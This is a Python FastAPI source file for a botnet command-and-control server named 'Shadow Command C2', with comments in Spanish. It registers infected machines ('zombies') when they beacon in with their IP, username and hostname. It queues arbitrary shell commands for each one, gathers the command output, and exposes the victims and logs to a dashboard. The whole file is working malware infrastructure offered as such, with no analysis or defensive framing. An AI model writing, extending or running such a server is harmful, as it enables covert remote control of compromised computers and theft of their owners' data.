from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict
import datetime

app = FastAPI(title="Shadow Command C2")

# CONFIGURACIÓN CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# -- MEMORIA VOLÁTIL --
zombies = []
pending_commands: Dict[str, List[str]] = {} 
# NUEVO: Historial de respuestas para enviarlas al frontend
command_history = [] 

class BeaconData(BaseModel):
    id: str
    ip: str
    username: str
    os: str
    hostname: str

class CommandResult(BaseModel):
    id: str
    command: str
    output: str

# -- ENDPOINTS --

@app.get("/")
def read_root():
    return {"status": "Mothership Online", "zombies": len(zombies)}

@app.post("/beacon")
def beacon(data: BeaconData):
    existing = next((z for z in zombies if z['id'] == data.id), None)
    if not existing:
        new_zombie = data.dict()
        new_zombie['last_seen'] = datetime.datetime.now().strftime("%H:%M:%S")
        zombies.append(new_zombie)
        pending_commands[data.id] = []
        print(f"💀 [NUEVO] Infectado: {data.hostname}")
    else:
        existing['last_seen'] = datetime.datetime.now().strftime("%H:%M:%S")

    commands_to_send = pending_commands.get(data.id, [])
    if commands_to_send:
        pending_commands[data.id] = []
        return {"action": "execute", "commands": commands_to_send}
    
    return {"action": "sleep", "commands": []}

@app.post("/shell/{zombie_id}")
def queue_command(zombie_id: str, cmd: str):
    if zombie_id not in pending_commands:
        pending_commands[zombie_id] = []
    pending_commands[zombie_id].append(cmd)
    return {"status": "Queued", "command": cmd}

@app.post("/results")
def receive_results(result: CommandResult):
    print(f"\n⚡ [RESULTADO] {result.id}: {result.command}")
    
    # GUARDAMOS EL RESULTADO EN LA LISTA
    log_entry = {
        "zombie_id": result.id,
        "type": "result",
        "content": result.output,
        "time": datetime.datetime.now().strftime("%H:%M:%S")
    }
    command_history.append(log_entry)
    
    return {"status": "Received"}

# NUEVO ENDPOINT: El dashboard usará esto para descargar los logs
@app.get("/api/logs/{zombie_id}")
def get_logs(zombie_id: str):
    # Filtramos solo los logs de este zombie específico
    return [log for log in command_history if log['zombie_id'] == zombie_id]

@app.get("/api/zombies")
def get_zombies():
    return zombies